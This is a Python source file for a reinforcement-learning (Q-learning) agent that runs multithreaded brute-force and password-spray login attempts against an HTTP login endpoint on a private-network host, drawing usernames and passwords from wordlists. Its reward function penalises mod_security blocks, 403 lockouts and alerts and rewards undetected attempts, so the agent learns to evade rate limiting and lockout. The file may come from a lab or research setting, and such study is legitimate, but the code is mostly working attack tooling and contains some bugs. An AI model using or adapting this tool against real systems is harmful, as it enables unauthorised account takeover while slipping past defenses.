"""TODO:
Change state:
#'exploration_rate': 0.1, 
#'current_password': '123456', 
#'current_user': 'admin',
#'attempted_passwords': ['123456', 'password'],
#'response_time': 0.5, # in seconds 
#Our hash table of user-password would be a good idea

#Everything should be discretized using max 20 attempts as base

state = { 
#Number of attempts made by the agent for the current user in the last 5 seconds, Range: 0-10
#10 max attempts in 5 seconds for purposes of state space
'attempted_passwords_this_user': 2,
#Number of attempts made by the agent in total, Range: 0-20
#discretize to 20 attempts based on reward
'num_attempts': 5, 
#Time elapsed since the last attempt, Range: 0-10
#max time between attempts is 10 deciseconds
'elapsed_time': 5, # in deciseconds
#Total time elapsed since the start of the episode, Range: 0- 29
#'total_time': 30, # in minutes
#The response code of the last attempt, Range: 0-10
#200, 403, 500, 503, 301, 302, 400, 303, 304, 307, 308
#'last_response_code': 403,
#The last error message received, if any, Range: 0-10
#Randomly select from a list of error messages or based on response code
'error_messages': ["Forbidden"], 
#Whether rate limiting is in effect/detected, Range: 0-1
'rate_limiting': False, 
#Whether lockout is in effect/detected, Range: 0-1
'lockout_status': False,
# Actual success rate based on "non-locked" attempts, Range: 0-1
# 'success_rate': 0.0, 
#Whether the agent is currently password spraying or other patters, Range: 0-1
'patterns': {"password_spray": True}, 
#The number of locks detected per minute
# Discretized to 10 locks
'total_locks': 0,
}

def hash_password(password): 
    return int(hashlib.md5(password.encode()).hexdigest(), 16) % 1000 

def state_to_index(state): 
    password_hash = hash_password(state['current_password']) 
    index = (password_hash * 10000 + 
        state['num_attempts'] * 1000 + 
        state['last_response_code'] * 10 + 
        int(state['rate_limiting']) * 2 + 
        int(state['lockout_status'])) 
    return


Ip Change!
End after x amount of time with a penalty

take the last 5 states to update q-table
"""




import numpy as np
import random
import time
from itertools import cycle
from HTTP import HTTPQuery
import threading
import SharedMemLib

class CustomEnv:
    def __init__(self):

        # Control variables
        self.query_count = 0
        self.done = False
        self.bestActionArray = []
        self.ActualActionArray = []
        self.lock = threading.Lock()

        # ML variables
        self.state = self.default_state()
        self.episode_reward = 0
        self.maxEpisodeSteps = 100

        # Agent variables
        self.PasswordSpray = False
        self.users = []
        self.passwords = []
        self.indexUsrs = 0
        self.indexPass_map = {i: 0 for i in range(len(self.users))}
        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        self.last_action_time = time.time()

        #self.http_query = HTTPQuery(
        #    host="http://192.168.16.147:8081",
        #    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
        #    post_query="username=${USER}&password=${PASS}",
        #    path="/login",
        #    use_post=True,
        #    use_json=False
        #)
        self.http_query = HTTPQuery(
            host="http://192.168.16.147:8082",
            path="/login",
            use_post=True,
            use_json=True
        )

        # Q-learning parameters
        #NumStates = 1000, NumActions = 5
        self.q_table = np.zeros((1000, 5))
        self.epsilon = 1.0
        self.alpha = 0.1
        self.gamma = 0.9
        self.time_penalty = 0

    # Function to read user list from a file
    def read_user_list(self,file_path, delimiter=None, password_list=None):
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if delimiter and not password_list:
                    user, password = line.split(delimiter)
                    self.users.append(user)
                    self.passwords.append(password)
                else:
                    self.users.append(line)
        return self.users, self.passwords

    # Function to read password list from a file
    def read_password_list(self,file_path):

        with open(file_path, 'r') as file:
            for line in file:
                self.passwords.append(line.strip())
        return self.passwords

    def get_next_pair(self):
        
        with self.lock:
            #Check when all lists are exhausted
            i = len(self.users)
            while self.indexUsrs < len(self.users) and i > 0:
                i -= 1
                if(self.indexPass_map[self.indexUsrs] < len(self.passwords)):
                    break
                self.indexUsrs += 1
                if self.indexUsrs >= len(self.users):
                    self.indexUsrs = 0
            
            if(self.indexUsrs == len(self.users) or self.indexPass_map[self.indexUsrs] >= len(self.passwords)) or i==0:
                return None, None

            if not self.PasswordSpray:
                item1 = self.users[self.indexUsrs]
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]
                self.indexPass_map[self.indexUsrs] += 1
                if self.indexPass_map[self.indexUsrs] >= len(self.passwords):
                    self.indexUsrs += 1
            else:
                item1 = self.users[self.indexUsrs]    
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]

                if self.indexUsrs >= len(self.users):
                    self.indexUsrs = 0
                    self.indexPass_map[self.indexUsrs] += 1

            self.total_attempt_count += 1
            return item1, item2

    def default_state(self):
        return (self.query_count, self.PasswordSpray)

    def choose_action(self, state):
        action_preferences = {0: 0.5, 1: 1, 2: 1, 3: 0.5}
        
        if random.uniform(0, 1) < self.epsilon:
            action = random.randint(0, 4)
            # Explore: Choose an action randomly with preferences
            probabilities = np.ones(4) * self.epsilon / 4
            for action, preference in action_preferences.items():
                probabilities[action] *= preference 
            probabilities /= probabilities.sum() # Normalize to ensure they sum to 1 
            action = np.random.choice(np.arange(4), p=probabilities)
        else:
            action = np.argmax(self.q_table[self.state_to_index(state)])
        #print(f"Choosing action {action} with epsilon {self.epsilon:.2f}")
        return action

    def adjust_epsilon(self):
        self.epsilon = max(0.01, self.epsilon * 0.995)

    def dynamic_timeout(self):

        success_rate = (
            self.undetected_attempt_count / self.total_attempt_count
            if self.total_attempt_count > 0
            else 0
        )
        #TODO: change the lockout probability and time penalty based on the success of the attack over the blocked user
        if success_rate < 0.5:
            self.time_penalty = min(self.time_penalty + 1, 3)
        else:
            self.time_penalty = max(self.time_penalty - 1, 0)

    def step(self, action):
        reward = 0
        self.maxEpisodeSteps -= 1
        #done = False

        self.dynamic_timeout()
        self.ActualActionArray.append(action)
        if action == 0:
            #print("Action: Wait")
            time.sleep(self.time_penalty)
            reward -= 1
        
        elif action == 1:
            #print("Action: Skip user")
            with self.lock:
                self.users.append(self.users.pop(self.indexUsrs))
            reward -= 0.1
            #self.indexUsrs += 1
        elif action == 2:
            self.last_action_time = time.time()
            #print("Action: Try next password")
            username, password = self.get_next_pair()
            if(username is None or password is None):
                self.done = True
                print("All username-password pairs exhausted.")
                return self.state, reward+100, self.done
            
            success, status_code, response_text = self.http_query.perform_query_verbose(
                username=username,
                password=password,
                search_string="Welcome"
            )
            reward += self.determine_reward_from_response(success, status_code, response_text)

            self.query_count += 1
            self.total_attempt_count += 1
            if success:
                reward += 100
                self.done = True
                print("Login successful!")
            else:
                #reward += 1
                self.undetected_attempt_count += 1
                #if 50 attempts are made, then reward += 5
                if self.total_attempt_count % 25 == 0:
                    reward += 20
                    0
                #print(f"Attempt failed without lockout. {self.undetected_attempt_count} undetected attempts.")

        elif action == 3:
            #print("Action: Toggle brute force and password spray")
            self.change_traversal()
            reward -= 0.1
        elif action == 4:
            with self.lock:
                time.sleep(self.time_penalty)
            reward -= 1.2
        
        if time.time() - self.last_action_time > 1:
            reward -= 10
        #todo: read from shared memory, if there's a message, then reward -= 15
        reward += self.read_write_sharedMem()


        state_idx = self.state_to_index(self.state)
        next_state_idx = self.state_to_index(self.default_state())
        best_next_action = np.argmax(self.q_table[next_state_idx])
        self.q_table[state_idx, action] += self.alpha * (
            reward + self.gamma * self.q_table[next_state_idx, best_next_action]
            - self.q_table[state_idx, action]
        )

        self.adjust_epsilon()

        self.state = (self.query_count, self.PasswordSpray)
        #print(f"New state: {self.state}, Reward: {reward}, Done: {self.done}")
        return self.state, reward
    
    def change_traversal(self):
        with self.lock:
            self.PasswordSpray = not self.PasswordSpray
            
    def state_to_index(self, state):
        index = state[0] * 2 + (0 if state[1] == False else 1)
        return index if index < 1000 else 999

    def determine_reward_from_response(self, success, status_code, response_text):
        reward = 0
        #Default mod_security resopnse
        if "forbidden" in response_text.lower():
            reward -= 15
        
        elif status_code == 403 or "blocked" in response_text.lower():
            reward -= 10
            print("Lockout detected (403).")
            time.sleep(self.time_penalty)
        
        if success:
            reward += 2
        return reward

    def read_write_sharedMem(self):
        message = SharedMemLib.read_write_sharedMem(SharedMemLib.Mode.READ)
        reward = 0
        if message:
            reward -= 15
        return reward

    def reset(self):
        self.query_count = 0
        self.PasswordSpray = False
        self.state = self.default_state()
        
        self.indexUsrs = 0
        self.indexPass_map = {i: 0 for i in range(len(self.users))}
        self.PasswordSpray = False

        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        env.episode_reward = 0
        print("Environment reset.")

        # Sleep for default lockout time + 1 second at the beginning of each new episode
        time.sleep(self.time_penalty + 1)

        return self.state
    
    def worker(self):
        
        while not env.done and env.maxEpisodeSteps > 0:
            # Choose action based on the current state
            action = self.choose_action(self.state)
                
            # Perform the chosen action and observe the results
            next_state, reward = self.step(action)
            env.episode_reward += reward

            # Update state
            self.state = next_state
        return env.episode_reward

    def runEnvironment(self, episode: int, max_steps_per_episode: int = 100, num_threads: int = 10):
        
        self.reset()
        self.maxEpisodeSteps = max_steps_per_episode
        
        print(f"=== Starting Episode {episode + 1} ===")
        #restart the action array
        self.ActualActionArray = []
        #for step in range(max_steps_per_episode):
        #env.episode_reward = 0
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=self.worker)
            thread.start()
            
            threads.append(thread)
        for thread in threads:
            thread.join()
            # Check if the episode is done (i.e., successful login or lockout)
        if self.done:
            print(f"Episode finished after {self.step + 1} steps with total reward: {env.episode_reward}")
                #exit() #terminate early to see if we actually successfuly detect login
        return env.episode_reward


if __name__ == "__main__":
    env = CustomEnv()
    num_episodes = 1000
    max_steps_per_episode = 500
    total_rewards = []
    user_file = "../Data/usernames.txt"
    password_file = "../Data/passwords.txt"
    delimiter = None
    best_reward = 0
    users, passwords = env.read_user_list(user_file, delimiter)
    if not passwords:
        passwords = env.read_password_list(password_file)

    for episode in range(num_episodes):
        
        env.episode_reward = env.runEnvironment(episode=episode)
        if(env.episode_reward > best_reward):
            best_reward = env.episode_reward
            env.bestActionArray = env.ActualActionArray
        total_rewards.append(env.episode_reward)
        
        print(f"Episode {episode + 1} reward: {env.episode_reward} attempts: {env.total_attempt_count}")

    # Post-training summary
    print("\n=== Training Complete ===")
    print(f"Average reward per episode: {np.mean(total_rewards):.2f}")
    print(f"Highest reward in an episode: {max(total_rewards)}")
    print(f"Best action array: {env.bestActionArray}")
    print(f"Lowest reward in an episode: {min(total_rewards)}")
